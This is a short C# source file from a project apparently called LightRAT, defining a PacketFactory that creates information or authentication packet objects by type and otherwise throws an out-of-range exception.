using System;

namespace LightRAT.Network.Packets.Factory
{
    public class PacketFactory
    {
        public IPacket CreatePacket(PacketType type)
        {
            switch (type)
            {
                case PacketType.Information:
                    return new InformationPacket();
                case PacketType.Authentication:
                    return new AuthenticationPacket();
                default:
                    throw new ArgumentOutOfRangeException(nameof(type), type, null);
            }
        }
    }
}
